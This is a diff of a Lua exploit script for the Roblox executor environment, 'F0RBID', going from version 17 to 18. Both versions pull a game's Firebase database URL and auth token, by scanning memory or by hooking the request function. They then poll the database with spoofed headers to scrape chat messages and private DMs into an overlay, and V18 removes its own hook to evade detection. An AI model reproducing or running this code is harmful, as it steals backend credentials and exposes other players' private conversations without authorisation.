@@ -1,23 +1,23 @@
 -- ========================================================== --
--- 🌑 F0RBID V17: THE NEURAL MAPPER (DEEP PATH EXPOSE)
+-- 🌑 F0RBID V18: THE GHOST HOOK (ULTRA-STEALTH BYPASS)
 -- ========================================================== --
-print("[F0RBID] 🛰️ Neural Mapper Engaged. Identity: [F0RBID_HIDDEN_OP]")
+print("[F0RBID] 🛰️ Ghost Hook Protocol Engaged. Identity: [HIDDEN]")
 
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
-local processedIds = {}
+local processedData = {}
 
 local TARGET_URL = nil
 local TARGET_AUTH = nil
 
 -- ========================================== --
--- 1. F0RBID PREMIUM UI (REFINED STEALTH)
+-- 1. F0RBID GHOST UI (STEALTH RED)
 -- ========================================== --
 local uiParent = (gethui and gethui()) or CoreGui
-if uiParent:FindFirstChild("F0rbidNeural") then uiParent.F0rbidNeural:Destroy() end
+if uiParent:FindFirstChild("F0rbidGhostV18") then uiParent.F0rbidGhostV18:Destroy() end
 
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "F0rbidNeural"
+ScreenGui.Name = "F0rbidGhostV18"
 ScreenGui.Parent = uiParent
 
 local Main = Instance.new("Frame")
@@ -37,7 +37,7 @@ local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -20, 0, 45)
 Title.Position = UDim2.new(0, 15, 0, 5)
 Title.BackgroundTransparency = 1
-Title.Text = "F0RBID <font color='#FF0000'>[NEURAL MAPPER V17]</font>"
+Title.Text = "F0RBID <font color='#FF0000'>[GHOST HOOK V18]</font>"
 Title.RichText = true
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Font = Enum.Font.GothamBold
@@ -45,16 +45,16 @@ Title.TextSize = 19
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.Parent = Main
 
-local StatusLine = Instance.new("TextLabel")
-StatusLine.Size = UDim2.new(1, -30, 0, 20)
-StatusLine.Position = UDim2.new(0, 15, 0, 40)
-StatusLine.BackgroundTransparency = 1
-StatusLine.Text = "● STATUS: SEARCHING FOR CHAT STRUCTURE..."
-StatusLine.TextColor3 = Color3.fromRGB(150, 0, 0)
-StatusLine.Font = Enum.Font.Code
-StatusLine.TextSize = 12
-StatusLine.TextXAlignment = Enum.TextXAlignment.Left
-StatusLine.Parent = Main
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, -30, 0, 20)
+Status.Position = UDim2.new(0, 15, 0, 40)
+Status.BackgroundTransparency = 1
+Status.Text = "● STATUS: WAITING FOR GHOST INTERCEPT..."
+Status.TextColor3 = Color3.fromRGB(150, 0, 0)
+Status.Font = Enum.Font.Code
+Status.TextSize = 11
+Status.TextXAlignment = Enum.TextXAlignment.Left
+Status.Parent = Main
 
 local Scroll = Instance.new("ScrollingFrame")
 Scroll.Size = UDim2.new(1, -20, 1, -110)
@@ -69,13 +69,13 @@ UIList.SortOrder = Enum.SortOrder.LayoutOrder
 UIList.Padding = UDim.new(0, 4)
 UIList.Parent = Scroll
 
-local function AddLog(tag, user, msg, col)
+local function AddLog(tag, user, msg)
     local txt = Instance.new("TextLabel")
     txt.Size = UDim2.new(1, 0, 0, 0)
     txt.BackgroundTransparency = 1
     txt.RichText = true
     txt.Text = string.format("<font color='#FF0000'>[%s]</font> <b>%s:</b> %s", tag, user, msg)
-    txt.TextColor3 = col or Color3.fromRGB(220, 220, 220)
+    txt.TextColor3 = Color3.fromRGB(220, 220, 220)
     txt.Font = Enum.Font.Code
     txt.TextSize = 12
     txt.TextWrapped = true
@@ -88,64 +88,48 @@ local function AddLog(tag, user, msg, col)
 end
 
 -- ========================================== --
--- 2. SMART PATH MAPPING LOGIC
+-- 2. FORCEFUL NEURAL EXTRACTION
 -- ========================================== --
-local function NeuralScan(data, path, parent)
+local function ForceExtract(data, path)
     if type(data) ~= "table" then return end
-    
-    for key, val in pairs(data) do
-        local currentPath = path .. "/" .. tostring(key)
-        
-        if type(val) == "table" then
-            -- Identify potential message packets
-            local m = val.m or val.message or val.content or val.text or val.c
-            local u = val.n or val.u or val.sender or val.username or val.name or "Ghost"
-
-            -- If keys are missing, look for any text content (Server/DM logic)
-            if not m then
-                for subK, subV in pairs(val) do
-                    if type(subV) == "string" and #subV > 1 and not subV:find("firebase") then
-                        if #subV > 12 and tonumber(subV) then -- It's an ID
-                        elseif subK == "u" or subK == "n" then u = subV
-                        else m = subV end
-                    end
-                end
-            end
-
-            if m and type(m) == "string" then
+    for k, v in pairs(data) do
+        local currentPath = path .. "/" .. tostring(k)
+        if type(v) == "table" then
+            local m = v.m or v.message or v.content or v.text or v.val
+            local u = v.n or v.u or v.sender or v.username or "Ghost"
+            
+            if m and type(m) == "string" and #m > 1 and not m:find("firebase") then
                 local tag = "LIVE"
-                if currentPath:lower():find("dm") then tag = "PRIVATE"
-                elseif #tostring(parent) > 8 then tag = "SERVER" end
-
+                if currentPath:lower():find("dm") then tag = "DM"
+                elseif #tostring(k) > 8 then tag = "SERVER" end
+                
                 local id = tostring(u)..tostring(m)..tag
-                if not processedIds[id] then
-                    processedIds[id] = true
-                    local col = (tag == "PRIVATE") and Color3.fromRGB(255, 100, 200) or Color3.fromRGB(255, 255, 255)
-                    AddLog(tag, tostring(u), tostring(m), col)
+                if not processedData[id] then
+                    processedData[id] = true
+                    AddLog(tag, tostring(u), tostring(m))
                 end
             end
-            NeuralScan(val, currentPath, key)
+            ForceExtract(v, currentPath)
         end
     end
 end
 
-local function StartNeuralSync()
+local function StartGhostSync()
     task.spawn(function()
-        while task.wait(1.5) do
+        while task.wait(1) do
             if TARGET_URL and TARGET_AUTH then
                 pcall(function()
                     local res = request({
                         Url = TARGET_URL .. "/.json?auth=" .. TARGET_AUTH,
                         Method = "GET",
                         Headers = {
-                            ["User-Agent"] = "F0RBID-NEURAL-MAPPER/17.0",
-                            ["X-Forwarded-For"] = string.format("%d.%d.%d.%d", math.random(10,250), math.random(10,250), math.random(10,250), math.random(10,250)),
-                            ["Identity-Mask"] = "F0RBID_OP"
+                            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                            ["X-Forwarded-For"] = string.format("%d.%d.%d.%d", math.random(1,255), math.random(1,255), math.random(1,255), math.random(1,255))
                         }
                     })
                     if res.Success then
                         local decoded = HttpService:JSONDecode(res.Body)
-                        if decoded then NeuralScan(decoded, "ROOT", "ROOT") end
+                        if decoded then ForceExtract(decoded, "VOID") end
                     end
                 end)
             end
@@ -154,47 +138,28 @@ local function StartNeuralSync()
 end
 
 -- ========================================== --
--- 3. PASSIVE REFLECTION (ZERO DETECTION)
+-- 3. THE GHOST HOOK (SELF-DESTRUCTING)
 -- ========================================== --
-task.spawn(function()
-    while not TARGET_URL do
-        -- Registry Scan (Silent)
-        for _, v in pairs(getreg()) do
-            if type(v) == "table" then
-                for k2, v2 in pairs(v) do
-                    local vs = tostring(v2)
-                    if vs:find("firebaseio.com") then
-                        TARGET_URL = vs:match("(https://[%w%-]+%.firebaseio%.com)")
-                    elseif (tostring(k2):lower():find("auth") or tostring(k2):lower():find("key")) and #vs > 25 then
-                        TARGET_AUTH = vs
-                    end
-                end
-            end
-        end
-        -- GC Constant Scan
-        if not TARGET_URL then
-            for _, f in pairs(getgc()) do
-                if type(f) == "function" and islclosure(f) and not isexecutorclosure(f) then
-                    for _, c in pairs(getconstants(f)) do
-                        if type(c) == "string" and c:find("firebaseio.com") then
-                            TARGET_URL = c:match("(https://[%w%-]+%.firebaseio%.com)")
-                        end
-                    end
-                    for _, uv in pairs(getupvalues(f)) do
-                        if type(uv) == "string" and #uv > 25 and not uv:find("/") then
-                            TARGET_AUTH = uv
-                        end
-                    end
-                end
-            end
-        end
-
+local hook
+hook = hookfunction(request, function(args)
+    if args.Url:find("firebaseio.com") and args.Url:find("auth=") then
+        TARGET_URL = args.Url:match("(https://[%w%-]+%.firebaseio%.com)")
+        TARGET_AUTH = args.Url:match("auth=([%w%.%-_]+)")
+        
         if TARGET_URL and TARGET_AUTH then
-            StatusLine.Text = "● IDENTITY: 🟢 F0RBID_INFILTRATION_SUCCESSFUL"
-            StatusLine.TextColor3 = Color3.fromRGB(0, 255, 0)
-            StartNeuralSync()
-            break
+            Status.Text = "● STATUS: 🟢 GHOST INTERCEPT SUCCESSFUL"
+            Status.TextColor3 = Color3.fromRGB(0, 255, 0)
+            
+            -- SELF-DESTRUCT: Remove hook immediately after capture to avoid kick
+            hookfunction(request, hook)
+            warn("🎯 [F0RBID] Hook Disengaged. Extraction Started.")
+            StartGhostSync()
         end
-        task.wait(2)
     end
+    return hook(args)
 end)
+
+-- Fallback for other executors
+if syn and syn.request then hookfunction(syn.request, hook) end
+
+print("✅ F0RBID V18 Ready. Ghost Hook is lurking...")
